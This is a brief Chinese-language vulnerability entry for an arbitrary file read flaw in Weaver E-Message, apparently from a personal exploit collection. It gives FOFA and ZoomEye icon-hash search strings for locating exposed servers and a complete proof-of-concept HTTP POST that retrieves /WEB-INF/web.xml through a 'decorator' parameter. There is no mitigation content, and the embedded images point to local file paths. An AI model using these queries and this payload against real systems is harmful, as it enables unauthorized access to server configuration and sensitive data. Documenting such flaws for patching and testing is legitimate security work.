# e-message管理页面文件读取漏洞

## 漏洞描述

泛微E-Message是一款企业邮件系统，任意文件读取漏洞通常是指通过漏洞可以访问服务器上的任意文件，这可能导致敏感信息泄露。

![image-20240423230501202](D:\safe\SafeStudy\锦囊\漏洞库\vulset\任意文件操作\assets\image-20240423230501202.png)

## 网空引擎

**FOFA:** icon_hash="-1477694668"

**zoomeye:** iconhash: "-1477694668"

![image-20240423230441788](D:\safe\SafeStudy\锦囊\漏洞库\vulset\任意文件操作\assets\image-20240423230441788.png)

![image-20240423232239648](D:\safe\SafeStudy\锦囊\漏洞库\vulset\任意文件操作\assets\image-20240423232239648.png)

## POC

```
POST / HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36
Content-Length: 43
Cache-Control: max-age=0
Connection: close
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
Accept-Encoding: gzip, deflate

decorator=%2FWEB-INF%2Fweb.xml&confirm=true
```

